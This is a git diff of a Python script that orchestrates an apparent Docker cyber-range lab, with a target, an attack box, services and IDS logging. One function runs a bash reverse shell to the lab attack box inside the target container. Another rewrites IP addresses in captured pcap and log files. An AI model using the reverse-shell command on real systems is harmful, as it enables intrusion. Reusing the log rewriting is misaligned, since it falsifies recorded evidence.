@@ -1,6 +1,7 @@
 #!/usr/bin/env python3
 import os
 import re
+import stat
 import time
 import json
 import docker
@@ -8,15 +9,17 @@ import signal
 import socket
 import psutil
 import argparse
+import binascii
 import requests
 import psycopg2
 import subprocess
 import multiprocessing as mp
-import espcap.espcap as espcap
 
 from io import BytesIO
 from scapy.all import *
 from mysql.connector import connect, Error
+
+from ipaddress import ip_network, ip_address
 
 
 docker_client = docker.DockerClient(base_url='unix://var/run/docker.sock')
@@ -27,6 +30,85 @@ containers = []
 
 dir_path = os.path.dirname(os.path.realpath(__file__))
 
+pcap_file = "capture_{}.pcap".format(time.strftime("%d%m%Y"))
+
+output_fldr = "{}/output_files/{}".format(dir_path,time.strftime("%d-%m-%Y_%H%M"))
+
+class Container:
+    #def __init__(self, name, image, ipv4_addr, svc_check, default_port, run_as_user, command, environment=[], volumes=[], capabilities=[]):
+    def __init__(self, name, image, ipv4_addr=None, svc_check=None, default_port=None, run_as_user=None, command=None, environment=None, volumes=None, capabilities=None, devices=None, **kw):
+
+        #key_word_args = ["ipv4_addr","svc_check","default_port","run_as_user","command","environment", "volumes", "capabilities"]
+
+        self.name = name
+        self.image = image
+        self.ipv4_addr = ipv4_addr
+        self.svc_check = svc_check
+        self.default_port = default_port
+        self.run_as_user = run_as_user
+        self.command = command
+        self.environment = environment
+        self.volumes = volumes
+        self.capabilities = capabilities
+        self.devices = devices
+
+def log_clean_up():
+    with open("{}/resource_files/{}".format(dir_path,pcap_file), 'rb') as f:
+        content = f.read()
+
+    hex_str = binascii.hexlify(content).decode('ascii')
+
+    rpl_hex_str = hex_str.replace("ac120001","ac12009d")
+
+    file_str = binascii.unhexlify(rpl_hex_str)
+
+    with open("{}/{}".format(output_fldr,pcap_file), 'wb') as f:
+        f.write(file_str)
+
+    os.chown("{}/{}".format(output_fldr,pcap_file),1001,1001)
+
+    for root, dirs, files in os.walk("{}/resource_files/logfiles".format(dir_path)):
+        for file in [os.path.join(root, f) for f in files]:
+            os.chown(file,1001,1001)
+            os.chmod(file, stat.S_IRUSR | stat.S_IWUSR | stat.S_IRGRP | stat.S_IWGRP | stat.S_IROTH | stat.S_IWOTH)
+
+            with open(file, 'r') as file_in :
+                filedata = file_in.read()
+
+            filedata = filedata.replace('"172.18.0.1"', '"172.18.0.157"')
+            filedata = filedata.replace('172.18.0.1:', '172.18.0.157:')
+
+            with open("{}/{}".format(output_fldr,os.path.basename(file)), 'w') as file_out:
+                file_out.write(filedata)
+
+    bits, _ = api_client.get_archive("AttackBox", '/var/log/syslog')
+
+    tar_f = open('{}/AttackBox_Syslog.tar'.format(output_fldr), 'wb')
+
+    for chunk in bits:
+        tar_f.write(chunk)
+        tar_f.close()
+    
+    #TODO add in elasticdump commands here
+    
+    # Need to dynamically pull the filebeat indices and then we should be good to just parse as a docker command
+    
+    #docker run --rm -it --name=elasticdump --net=uwe_tek_external -v $(pwd):/tmp elasticdump/elasticsearch-dump --input=http://172.18.0.10:9200/filebeat-7.17.2-2022.08.22-000001 --output=/tmp/filebeat_mapping.json --type=mapping
+    #docker run --rm -it --name=elasticdump --net=uwe_tek_external -v $(pwd):/tmp ^Casticdump/elasticsearch-dump --input=http://172.18.0.10:9200/filebeat-7.17.2-2022.08.22-000001 --output=/tmp/filebeat_analyzer.json --type=analyzer
+    #docker run --rm -it --name=elasticdump --net=uwe_tek_external -v $(pwd):/tmp elasticdump/elasticsearch-dump --input=http://172.18.0.10:9200/filebeat-7.17.2-2022.08.22-000001 --output=/tmp/filebeat_data.json --type=data
+
+    
+    print("\nShutting down - Output files saved in {}".format(output_fldr))
+
+
+def clean_exit(sig, frame):
+    #ac120001 = 172.18.0.1 - Host (browser activity etc)
+    #ac12009d = 172.18.0.157 - AttackBox
+    
+    log_clean_up()
+
+    sys.exit(0)
+
 
 def local_docker_check(image):
     try:
@@ -34,8 +116,9 @@ def local_docker_check(image):
     except docker.errors.ImageNotFound:#
         print("{} not found locally - Pulling image".format(image))
         docker_client.images.pull(image)
+
         print("{} saved locally".format(image))
-    
+
     return
 
 
@@ -51,10 +134,8 @@ def container_check(container_name, status_to_check=None):
         while status != status_to_check:
             time.sleep(5)
             status = container.status
-    else:
-        return status
 
-    return
+    return status
 
 
 def service_check(address):
@@ -75,415 +156,132 @@ def service_check(address):
 
 
 def rev_shell_handler(target_os):
-	sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-	sock.bind(("0.0.0.0", 9876))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    sock.bind(("0.0.0.0", 9876))
 
-	while True:
-		print("Listening!")
-		data, (ip, port) = sock.recvfrom(2048)
-		if Ether in Ether(data):
-			print(data)
-			if ICMP in pkt:
-				cmd_in_container = api_client.exec_create(target_os, "/bin/bash -i >& /dev/tcp/172.18.0.157/4242 0>&1")
-				result = api_client.exec_start(cmd_in_container, detach=True)
- 				
+    while True:
+        print("Listening!")
+        data, (ip, port) = sock.recvfrom(2048)
+        if Ether in Ether(data):
+            print(data)
+            if ICMP in pkt:
+                cmd_in_container = api_client.exec_create(target_os, "/bin/bash -i >& /dev/tcp/172.18.0.157/4242 0>&1")
+                result = api_client.exec_start(cmd_in_container, detach=True)
+                 
 
 def get_uwe_net_interface():
 
-	uwe_net_interface = ""
+    uwe_net_interface = ""
 
-	addrs = psutil.net_if_addrs()
-	
-	for key, val in addrs.items():
-		for i in val:
-			if "172.18.0.1" in i:
-				uwe_net_interface = key
-				break
-	
-	return uwe_net_interface 
-
-
-def elastic_setup():
-
-    if container_check("elasticsearch") != "running":
-
-        local_docker_check("elasticsearch:7.17.2")
-
-        elastic_container = docker_client.containers.create("elasticsearch:7.17.2",
-        detach=True, 
-        name="elasticsearch", 
-        environment=["discovery.type=single-node"])
-
-        docker_client.networks.get("uwe_tek").connect(elastic_container, 
-        ipv4_address="172.18.0.10")
-
-        elastic_container.start()
-        containers.append("elasticsearch")
+    addrs = psutil.net_if_addrs()
     
-        # Wait for container(s) to come online   
-        container_check("elasticsearch", "running")
-
-    service_check("http://172.18.0.10:9200")
-        
-    return "elasticsearch:7.17.2 is up and running and can be accessed on 172.18.0.10:9200\n"
-
-def kibana_setup():
-
-    if container_check("kibana") != "running":
-
-        local_docker_check("kibana:7.17.2")
-
-        kibana_container = docker_client.containers.create("kibana:7.17.2", 
-        detach=True, 
-        name="kibana")
-
-        docker_client.networks.get("uwe_tek").connect(kibana_container, 
-        ipv4_address="172.18.0.11")
-
-        kibana_container.start()
-        containers.append("kibana")
+    for key, val in addrs.items():
+        for i in val:
+            if "172.18.0.1" in i:
+                uwe_net_interface = key
+                break
     
-        # Wait for container(s) to come online   
-        container_check("kibana", "running")
-    
-    service_check("http://172.18.0.11:5601/status")
-        
-    return "kibana:7.17.2 is up and running and can be accessed on 172.18.0.11:5601\n"
+    return uwe_net_interface 
 
 
-def log_monitor_setup():
+def container_setup(Container, use_sdk, subprocess_list=[], on_running_cmds=[]):
 
-    if container_check("filebeat") != "running":
+    dbs_list = ["mysql", "postgresql"]
 
-        local_docker_check("docker.elastic.co/beats/filebeat:7.17.2")
+    if container_check(Container.name) != "running":
 
-        subprocess.run(['gnome-terminal', '-x', 'bash', '-c', 'docker run --rm --name=filebeat_setup --net uwe_tek --ip 172.18.0.9 docker.elastic.co/beats/filebeat:7.17.2 setup -E setup.kibana.host=172.18.0.11:5601 -E output.elasticsearch.hosts=["172.18.0.10:9200"]'], stderr=subprocess.STDOUT, stdout=subprocess.PIPE)
+        local_docker_check(Container.image)
 
-        print("Filebeat setup completed")
+        if len(subprocess_list) >= 2:
 
+            subprocess_type = subprocess_list[0]
+            subprocess_cmd = subprocess_list[1]
 
-        filebeat_container = docker_client.containers.create("docker.elastic.co/beats/filebeat:7.17.2", 
-        detach=True, 
-        name="filebeat", 
-        user="root", 
-        environment=["output.elasticsearch.hosts=['172.18.0.10:9200']"],
-        volumes=['{}/resource_files/Configs/filebeat.docker.yml:/usr/share/filebeat/filebeat.yml:ro'.format(dir_path), 
-        '{}/resource_files/Configs/filebeat_suricata.yml:/usr/share/filebeat/modules.d/suricata.yml:ro'.format(dir_path),
-        '{}/resource_files/logfiles:/var/log/suricata/:ro'.format(dir_path),
-        '/var/lib/docker/containers:/var/lib/docker/containers:ro', 
-        "/var/run/docker.sock:/var/run/docker.sock:ro"],
-        command="-strict.perms=false")
-        
-        docker_client.networks.get("uwe_tek").connect(filebeat_container, 
-        ipv4_address="172.18.0.12")
+            if subprocess_type == "run":
+                subprocess.run(['gnome-terminal', '-x', 'bash', '-c', subprocess_cmd], stderr=subprocess.STDOUT, stdout=subprocess.PIPE)
 
-        filebeat_container.start()
+            if subprocess_type == "popen":
+                subprocess.Popen(['gnome-terminal', '-x', 'bash', '-c', subprocess_cmd], stderr=subprocess.STDOUT, stdout=subprocess.PIPE)
 
-        containers.append("filebeat")
-    
-    return
-    
+        if use_sdk:
+            container = docker_client.containers.create(Container.image,
+            detach=True, 
+            name=Container.name,
+            user=Container.run_as_user,
+            command=Container.command, 
+            environment=Container.environment,
+            volumes=Container.volumes,
+            cap_add=Container.capabilities)
 
-def suricata_setup():
+            network_name = ""
 
-    if container_check("suricata") != "running":
+            if ip_address(Container.ipv4_addr) in ip_network("172.18.0.0/24"):
+                network_name = "uwe_tek_external"
 
-        local_docker_check("uwe_suricata:101")
-        
-        subprocess.run(['gnome-terminal', '-x', 'bash', '-c', 'docker run -d --name suricata --net=host --cap-add=net_admin --cap-add=net_raw --cap-add=sys_nice -v {}/resource_files/logfiles:/var/log/suricata uwe_suricata:101 -i {}'.format(dir_path,get_uwe_net_interface())],  stderr=subprocess.STDOUT, stdout=subprocess.PIPE)
+            if ip_address(Container.ipv4_addr) in ip_network("172.19.0.0/24"):
+                network_name = "uwe_tek_internal"
 
-        #suricata_container = docker_client.containers.create("jasonish/suricata:6.0", 
-        #detach=True, 
-        #name="suricata", 
-        #volumes=['{}/resource_files/logfiles:/var/log/suricata'.format(dir_path)],
-        #cap_add=["NET_ADMIN","NET_RAW", "SYS_NICE"],
-        #command="-i {}".format(get_uwe_net_interface))
-        
-        #docker_client.networks.get("host").connect(suricata_container)
+            docker_client.networks.get(network_name).connect(Container.name,ipv4_address=Container.ipv4_addr)
 
-        #suricata_container.start()
+            container.start()
 
-        containers.append("suricata")
-    
-    return
+        container_status = ""
 
-
-def internal_httpd_setup():
-
-    if container_check("httpd") != "running":
-
-        local_docker_check("uwe_httpd:101")
-
-        httpd_container = docker_client.containers.create("uwe_httpd:101", 
-        detach=True, 
-        name="httpd", 
-        volumes=['{}/resource_files/Configs/httpd.conf:/usr/local/apache2/conf/httpd.conf:ro'.format(dir_path), '{}/resource_files/htdocs:/usr/local/apache2/htdocs/'.format(dir_path)],
-        cap_add=["NET_ADMIN","NET_RAW"])
-
-        docker_client.networks.get("uwe_tek").connect(httpd_container, 
-        ipv4_address="172.18.0.13")
-        
-        httpd_container.start()
-
-        container_check("httpd", "running")
-        
-        block_attackbox_inbound = api_client.exec_create("httpd", "iptables -A INPUT -s 172.18.0.157 -j DROP")
-        block_attackbox_outbound = api_client.exec_create("httpd", "iptables -A OUTPUT -d 172.18.0.157 -j DROP")
-        
-        result_inbound = api_client.exec_start(block_attackbox_inbound, detach=True)
-        result_outbound = api_client.exec_start(block_attackbox_outbound, detach=True)
-
-        containers.append("httpd")
-    
-    return "uwe_httpd:101 is up and running on 172.18.0.13\n"
-
-
-def mysql_setup():
-
-    if container_check("mysql") != "running":
-
-        local_docker_check("uwe_mysql:101")
-
-        mysql_container = docker_client.containers.create("uwe_mysql:101", 
-        detach=True, 
-        name="mysql")
-
-        docker_client.networks.get("uwe_tek").connect("mysql", 
-        ipv4_address="172.18.0.14")
-
-        mysql_container.start()
-
-        container_check("mysql", "running")
-
-        containers.append("mysql")
-
-        # As with kibana we have a difference between the container running and the microservice
-        # Test connection with known bad creds until we get the expected error
-        no_connection = True
-
-        print("Waiting for MySQL to come online - This may take several minutes")
-
-        while no_connection:
+        # Wait for container(s) to come online
+        while container_status != "running":
             time.sleep(5)
-            try:
-                with connect(
-                    host="172.18.0.14",
-                    user="test",
-                    password="ing",
-                ) as connection:
-                    break
-            except Error as e:
-                if "Access denied for user" in str(e):
-                    no_connection = False
-    
-    print("MySQL is online")
-
-    return 
-
-
-def phpmyadmin_setup():
-
-    if container_check("phpmyadmin") != "running":
-
-        local_docker_check("phpmyadmin:5.2.0")
-
-        mysql_container = docker_client.containers.create("phpmyadmin:5.2.0", 
-        detach=True, 
-        name="phpmyadmin",
-        environment=["PMA_HOST=172.18.0.14"])
-
-        docker_client.networks.get("uwe_tek").connect("phpmyadmin", 
-        ipv4_address="172.18.0.15")
-
-        mysql_container.start()
-
-        container_check("phpmyadmin", "running")
-
-        containers.append("phpmyadmin")
-
-        # As with kibana we have a difference between the container running and the microservice
-        # Test connection with known bad creds until we get the expected error
-        no_connection = True
-
-        service_check("http://172.18.0.15")
-    
-    return "phpmyadmin:5.2.0 is up and running on 172.18.0.15\n"
-    
-
-def joomla_setup():
-
-    if container_check("joomla") != "running":
-
-        local_docker_check("uwe_joomla:101")
-
-        mysql_container = docker_client.containers.create("uwe_joomla:101", 
-        detach=True, 
-        name="joomla",
-        environment=["JOOMLA_DB_HOST=172.18.0.14:3306"])
-
-        docker_client.networks.get("uwe_tek").connect("joomla", 
-        ipv4_address="172.18.0.16")
-
-        mysql_container.start()
-
-        container_check("joomla", "running")
-
-        containers.append("joomla")
-
-        # As with kibana we have a difference between the container running and the microservice
-        # Test connection with known bad creds until we get the expected error
-        no_connection = True
-
-        service_check("http://172.18.0.16")
-    
-    return "uwe_joomla:101 is up and running on 172.18.0.16\n"
-
-
-def postgres_setup():
-
-    if container_check("postgres") != "running":
-
-        local_docker_check("uwe_postgres:101")
-
-        postgres_container = docker_client.containers.create("uwe_postgres:101", 
-        detach=True, 
-        name="postgres")
-
-        docker_client.networks.get("uwe_tek").connect("postgres", 
-        ipv4_address="172.18.0.17")
-
-        postgres_container.start()
-
-        container_check("postgres", "running")
-
-        containers.append("postgres")
-
-        # As with kibana we have a difference between the container running and the microservice
-        # Test connection with known bad creds until we get the expected error
-        no_connection = True
-
-        while no_connection:
-            time.sleep(2)
-            
-            try:
-                conn = psycopg2.connect(
-                        host="172.18.0.17",
-                        database="test",
-                        user="test",
-                        password="ing")
-            except Exception as e:
-                if "authentication failed" in str(e):
-                    no_connection = False
-
-    return "uwe_postgres:101 is up and running on 172.18.0.17:5432\n"
-
-
-def confluence_setup():
-
-	if container_check("confluence") != "running":
-
-		local_docker_check("uwe_confluence:101")
-
-		#Needs to be a interactive subprocess for the output to stdout to work
-
-		subprocess.Popen(['gnome-terminal', '-x', 'bash', '-c', 'docker run --name confluence --net uwe_tek --ip 172.18.0.19 -it uwe_confluence:101'], stderr=subprocess.STDOUT, stdout=subprocess.PIPE)
-
-		container_check("confluence", "running")
-
-		service_check("http://172.18.0.19:8090")
-		
-		cmd_in_container = api_client.exec_create("confluence", "nohup bash /tomcat_to_stdout.sh &")
-		
-		result = api_client.exec_start(cmd_in_container, detach=True)
-
-		containers.append("confluence")
-
-        #TODO - Add in docker exec for nohup
+            container_status = container_check(Container.name)
         
-	return "uwe_confluence:101 is up and running on 172.18.0.19:8090\n"
+        containers.append(Container.name)
 
-
-def server_os_setup(target_os):
-
-    if container_check(target_os) != "running":
-
-        local_docker_check("uwe_{}:101".format(target_os))
-
-        os_container = docker_client.containers.create("uwe_{}:101".format(target_os), 
-        detach=True, 
-        name=target_os)
-
-        docker_client.networks.get("uwe_tek").connect(os_container, 
-        ipv4_address="172.18.0.200")
-        
-        os_container.start()
-
-        container_check(target_os, "running")
-
-        containers.append(target_os)
-    
-    return "uwe_{}:101 is up and running on 172.18.0.200\n".format(target_os)
-    
-
-def container_attackbox():
-	
-	if container_check("AttackBox") != "running":
-
-		local_docker_check("uwe_attackbox:101")
-
-		subprocess.Popen(['gnome-terminal', '-x', 'bash', '-c', 'docker run --name AttackBox --net uwe_tek --ip 172.18.0.157 --cap-add=NET_ADMIN --cap-add=NET_RAW -it uwe_attackbox:101'], stderr=subprocess.STDOUT, stdout=subprocess.PIPE)
-
-		containers.append("AttackBox")
-    
-	return "{} is up and running on 172.18.0.157\n".format("AttackBox")
-
-
-def traffic_creation_setup():
-
-    container_names = ["blue_team", "red_team"]
-
-    ipv4_addresses = ["172.18.0.20", "172.18.0.21"]
-
-    for i in range(0, len(container_names)):
-
-        if container_check(container_names[i]) == "running":
-
-            container = docker_client.containers.get(container_names[i])
-            container.stop()
-
-            container_status = container_check(container_names[i])
-
-            while container_status != "removed":
+        if Container.name.lower() in dbs_list:
+            no_connection = True
+            # DBS connection check
+            while no_connection:
                 time.sleep(5)
-                container_status = container_check(container_names[i])
+                try:
+                    with connect(
+                        host=Container.ipv4_addr,
+                        user="test",
+                        password="ing",
+                    ) as connection:
+                        break
+                except Error as e:
+                    if "Access denied for user" in str(e):
+                        no_connection = False
 
-    # issues with trying to do both in the same loop due to C2 dependencies for containers
-    for i in range(0, len(container_names)):
+        if Container.svc_check != None:
+            service_check(Container.svc_check)
 
-        subprocess.Popen(['gnome-terminal', '-x', 'bash', '-c', 'docker run -it --rm --name {} --net uwe_tek --ip {} uwe_battleships:{}'.format(container_names[i],ipv4_addresses[i],container_names[i])], stderr=subprocess.STDOUT, stdout=subprocess.PIPE)
-    
-    return
+        if len(on_running_cmds) >= 1:
+            for cmd in on_running_cmds:
+
+                cmd_create = api_client.exec_create(Container.name, cmd)
+            
+                cmd_execute = api_client.exec_start(cmd_create, detach=True)
+        
+    return "{} is up and running and can be accessed on {}:{}\n".format(Container.image,Container.ipv4_addr,Container.default_port)
 
 
-def network_create(network_subnets):
+def network_create(req_network, network_subnets):
 
     count = 18
     
     while True:
-        uwe_tek_subnet = "172.{}.0.0/24".format(str(count))
+        req_network_subnet = "172.{}.0.0/24".format(str(count))
 
-        if uwe_tek_subnet not in network_subnets:
+        if req_network_subnet not in network_subnets:
             break
         else:
             count += 1
 
-    ipam_pool = docker.types.IPAMPool(subnet=uwe_tek_subnet)
+    ipam_pool = docker.types.IPAMPool(subnet=req_network_subnet)
 
     ipam_config = docker.types.IPAMConfig(pool_configs=[ipam_pool])
 
-    api_client.create_network("uwe_tek",ipam=ipam_config)
+    api_client.create_network(req_network,ipam=ipam_config)
 
-    print("uwe_tek network created - Subnet = {}".format(uwe_tek_subnet))
+    print("{} network created - Subnet = {}".format(req_network,req_network_subnet))
 
     return
 
@@ -494,26 +292,34 @@ def sub_network_check():
 
     network_subnets = []
 
-    uwe_tek_exists = False
+    required_networks = ["uwe_tek_external", "uwe_tek_internal"]
 
-    for network in network_list:
-        if network["Name"] == "uwe_tek":
-            print("uwe_tek network found - Subnet = {}".format(network["IPAM"]["Config"][0]["Subnet"]))
-            uwe_tek_exists = True
-            break
-        if len(network["IPAM"]["Config"]) > 0:
-            for i in range(0,len(network["IPAM"]["Config"])):
-                network_subnets.append(network["IPAM"]["Config"][i]["Subnet"])
+    for req_network in required_networks:
 
-    if not uwe_tek_exists:
-        network_create(network_subnets)
+        req_network_exists = False
+
+        for network in network_list:
+            if network["Name"] == req_network:
+                print("{} network found - Subnet = {}".format(req_network,network["IPAM"]["Config"][0]["Subnet"]))
+                req_network_exists = True
+                break
+            if len(network["IPAM"]["Config"]) > 0:
+                for i in range(0,len(network["IPAM"]["Config"])):
+                    network_subnets.append(network["IPAM"]["Config"][i]["Subnet"])
+
+        if not req_network_exists:
+            network_create(req_network,network_subnets)
+
+        network_subnets = []
 
     return
 
 # Add in clean container shutdown on keyboard interrupt ...?        
 if __name__ == '__main__':
 
-    supported_os = ["ubuntu"]
+    signal.signal(signal.SIGINT, clean_exit)
+
+    supported_os = ["ubuntu", "alpine"]
 
     parser = argparse.ArgumentParser(description="CHANGEME")
 
@@ -530,59 +336,102 @@ if __name__ == '__main__':
     if target_os not in supported_os:
         exit("{} is not a support os. Please select a supported OS:\n{}".format(target_os,str(supported_os)))
 
+    mysql_container = Container("mysql", "uwe_mysql:101", ipv4_addr="172.18.0.6", volumes=["/etc/timezone:/etc/timezone:ro","/etc/localtime:/etc/localtime:ro"])
+
+    phpmyadmin_container = Container("phpmyadmin", "phpmyadmin:5.2.0", ipv4_addr="172.18.0.14", svc_check="http://172.18.0.14", environment=["PMA_HOST={}".format(mysql_container.ipv4_addr)], volumes=["/etc/timezone:/etc/timezone:ro","/etc/localtime:/etc/localtime:ro"])
+
+    joomla_container = Container("joomla", "uwe_joomla:101", ipv4_addr="172.18.0.15", svc_check="http://172.18.0.15", environment=["JOOMLA_DB_HOST={}:3306".format(mysql_container.ipv4_addr)], volumes=["/etc/timezone:/etc/timezone:ro","/etc/localtime:/etc/localtime:ro"])
+    
+    postgres_container = Container("postgres", "uwe_postgres:101", ipv4_addr="172.18.0.5", volumes=["/etc/timezone:/etc/timezone:ro","/etc/localtime:/etc/localtime:ro"])
+
+    confluence_container = Container("confluence", "uwe_confluence:101", svc_check="http://172.18.0.16:8090")
+
+    tomcat_container = Container("tomcat", "uwe_tomcat:101", svc_check="http://172.18.0.17:8080")
+
+    wordpress_container = Container("wordpress", "uwe_wordpress:101", ipv4_addr="172.18.0.18", svc_check="http://172.18.0.18", volumes=["/etc/timezone:/etc/timezone:ro","/etc/localtime:/etc/localtime:ro"])
+
+    httpd_container = Container("httpd", "uwe_httpd:101", ipv4_addr="172.19.0.11", volumes=['{}/resource_files/Custom_Containers/Configs/httpd.conf:/usr/local/apache2/conf/httpd.conf:ro'.format(dir_path), 
+        '{}/resource_files/Custom_Containers/htdocs:/usr/local/apache2/htdocs/'.format(dir_path),
+        "/etc/timezone:/etc/timezone:ro",
+        "/etc/localtime:/etc/localtime:ro"], capabilities=["NET_ADMIN","NET_RAW"])
+
+    dnsmasq_container = Container("dnsmasq", "uwe_dnsmasq:101", ipv4_addr="172.19.0.53", volumes=["/etc/timezone:/etc/timezone:ro","/etc/localtime:/etc/localtime:ro"], capabilities=["NET_ADMIN","NET_RAW"])
+
+    opensmtpd_container = Container("opensmtpd", "uwe_opensmtpd:101", ipv4_addr="172.19.0.25", volumes=["/etc/timezone:/etc/timezone:ro","/etc/localtime:/etc/localtime:ro"], capabilities=["NET_ADMIN","NET_RAW"])
+
+    random_traffic_container = Container("random_traffic", "uwe_traffic_generator:101", ipv4_addr="172.18.0.42", volumes=["/etc/timezone:/etc/timezone:ro","/etc/localtime:/etc/localtime:ro"],command='172.18.0.18 "home;index;hello;wp-admin"')
+
+    target_container = Container("target", "uwe_{}:101".format(target_os), ipv4_addr="172.18.0.200", volumes=["/etc/timezone:/etc/timezone:ro","/etc/localtime:/etc/localtime:ro"])
+
+    attackbox_container = Container("AttackBox", "uwe_attackbox:101") 
+
+    filebeat_container = Container("filebeat", "docker.elastic.co/beats/filebeat:7.17.2", ipv4_addr="172.18.0.12", run_as_user="root", command="-strict.perms=false", environment=["output.elasticsearch.hosts=['172.18.0.10:9200']"], volumes=['{}/resource_files/Custom_Containers/Configs/filebeat.docker.yml:/usr/share/filebeat/filebeat.yml:ro'.format(dir_path), 
+        '{}/resource_files/Custom_Containers/Configs/filebeat_suricata.yml:/usr/share/filebeat/modules.d/suricata.yml:ro'.format(dir_path),
+        '{}/resource_files/logfiles:/var/log/suricata/:ro'.format(dir_path),
+        '/var/lib/docker/containers:/var/lib/docker/containers:ro', 
+        "/var/run/docker.sock:/var/run/docker.sock:ro",
+        "/etc/timezone:/etc/timezone:ro",
+        "/etc/localtime:/etc/localtime:ro"])
+
+    suricata_container = Container("suricata", "uwe_suricata:101")
+
+    elasticsearch_container = Container("elasticsearch", "elasticsearch:7.17.2", ipv4_addr="172.18.0.10", svc_check="http://172.18.0.10:9200", default_port="9200", environment=["discovery.type=single-node"], volumes=["/etc/timezone:/etc/timezone:ro", "/etc/localtime:/etc/localtime:ro"])
+
+    kibana_container = Container("kibana", "kibana:7.17.2", ipv4_addr="172.18.0.11", svc_check="http://172.18.0.11:5601/status", default_port="5601", volumes=["/etc/timezone:/etc/timezone:ro", "/etc/localtime:/etc/localtime:ro"])
+        
+    containers_to_run ={
+
+        #"mysql":[mysql_container,True,[],[]],
+        #"phpmyadmin":[phpmyadmin_container,True,[],[]],
+        #"joomla":[joomla_container,True,[],[]],
+        "postgres":[postgres_container,True,[],[]],
+        "confluence":[confluence_container,False,["popen",'docker run -v /etc/timezone:/etc/timezone:ro -v /etc/localtime:/etc/localtime:ro --name confluence --net uwe_tek_external --ip 172.18.0.16 -it uwe_confluence:101'],["nohup bash /tomcat_to_stdout.sh &"]],
+        "tomcat":[tomcat_container,False,["popen",'docker run -v /etc/timezone:/etc/timezone:ro -v /etc/localtime:/etc/localtime:ro --name tomcat --net uwe_tek_external --ip 172.18.0.17 -it uwe_tomcat:101'],["nohup bash /tomcat_to_stdout.sh &"]],
+        "wordpress":[wordpress_container,True,[],[]],
+        #"httpd":[httpd_container,True,[],[]],
+        #"dnsmasq":[dnsmasq_container,True,[],[]],
+        #"opensmtpd":[opensmtpd_container,True,[],[]],
+        "random_traffic":[random_traffic_container,True,[],[]],
+        
+    }
+
+    required_containers ={
+
+        "target":[target_container,True,[],[]],
+        "attackbox":[attackbox_container,False,["popen",'docker run -v /etc/timezone:/etc/timezone:ro -v /etc/localtime:/etc/localtime:ro -v {}/exploit_material/:/exploit_material/ --name AttackBox --net uwe_tek_external --ip 172.18.0.157 --cap-add=NET_ADMIN --cap-add=NET_RAW -it uwe_attackbox:101'.format(dir_path)],["rsyslogd"]],
+        #"filebeat":[filebeat_container,True,["run",'docker run --rm --name=filebeat_setup --net uwe_tek_external --ip 172.18.0.9 docker.elastic.co/beats/filebeat:7.17.2 setup -E setup.kibana.host=172.18.0.11:5601 -E output.elasticsearch.hosts=["172.18.0.10:9200"]'],[]],
+        "suricata":[suricata_container,False,["run",'docker run -v /etc/timezone:/etc/timezone:ro -v /etc/localtime:/etc/localtime:ro -d --name suricata --net=host --cap-add=net_admin --cap-add=net_raw --cap-add=sys_nice -v {}/resource_files/logfiles:/var/log/suricata uwe_suricata:101 -i {}'.format(dir_path,get_uwe_net_interface())],[]],
+        #"elasticsearch":[elasticsearch_container,True,[],[]],
+        #"kibana":[kibana_container,True,[],[]],
+    
+    }
+
     sub_network_check()
-   
-    running_container_info += postgres_setup()
-    running_container_info += confluence_setup()
-	
-	#mysql_setup()
-    #running_container_info += phpmyadmin_setup()
-    #running_container_info += joomla_setup()
-
-    running_container_info += internal_httpd_setup()
-
-    running_container_info += server_os_setup(target_os.lower())
     
-    running_container_info += container_attackbox()
+    for _, v in containers_to_run.items():
+        running_container_info += container_setup(v[0],v[1],v[2],v[3])
 
-    # Done last to avoid polluting the logs with test connections
-    running_container_info += elastic_setup()
-    running_container_info += kibana_setup()
+    # Done last to avoid polluting logs with setup connections etc
+    for _, v in required_containers.items():
+        running_container_info += container_setup(v[0],v[1],v[2],v[3])
 
-    log_monitor_setup()
-    suricata_setup()
-
-    #traffic_creation_setup()
 
     print("----------------------------------------------------------------")
-    print(running_container_info)
+    print(running_container_info.replace("None", ""))
     print("----------------------------------------------------------------")
-    
-    # Run as multiprocess in background so it isn't blocking
-    #proc = mp.Process(target = rev_shell_handler, args = (target_os, ))
-    #proc.start()
-
-    # Make chunk sizing dynamic / changeable on the fly
 
     #TODO - make the blacklist ammendable so we can add confluence etc on the fly
-
-    filter_string = "src net 172.18.0.0/24 and dst net 172.18.0.0/24 and host not 172.18.0.10 and host not 172.18.0.11 and host not 172.18.0.12"
-
-    #filter_string = "host 172.18.0.1 and host not 172.18.0.10 and host not 172.18.0.11"
-
-    # How small / large an amount of data is cached before being sent to kibana
-    chunk_size = 1000
     
-    output_file = "{}/resource_files/capture_{}.pcap".format(dir_path,time.strftime("%d%m%Y"))
+    os.umask(0)
     
-    #espcap.main("172.18.0.10:9200","any",filter_string,chunk_size,0,containers)
+    capture_output = "{}/resource_files/{}".format(dir_path,pcap_file)
     
-    #espcap.main(None,"any",filter_string,chunk_size,0,containers,output_file)
-    
-    process = subprocess.Popen(['/usr/bin/tshark', '-i', 'any', '-w', '/home/uwe/Documents/goibhniu/resource_files/capture_29062022.pcap', 'src', 'net', '172.18.0.0/24', 'and', 'dst', 'net', '172.18.0.0/24', 'and', 'host', 'not', '172.18.0.10', 'and', 'host', 'not', '172.18.0.11', 'and', 'host', 'not', '172.18.0.12'],stderr=subprocess.STDOUT, stdout=subprocess.PIPE)
+    if not os.path.exists(capture_output):
+        os.mknod(capture_output, mode = 0o666)
+        
+    if not os.path.isdir(output_fldr):
+        os.makedirs(output_fldr)
+        
+    process = subprocess.Popen(['/usr/bin/tshark', '-i', 'any', '-w', capture_output, 'src', 'net', '172.18.0.0/24', 'and', 'dst', 'net', '172.18.0.0/24', 'and', 'host', 'not', '172.18.0.10', 'and', 'host', 'not', '172.18.0.11', 'and', 'host', 'not', '172.18.0.12'],stderr=subprocess.STDOUT, stdout=subprocess.PIPE)
     
     print(process.stdout.read())
-    
-    
-    
-
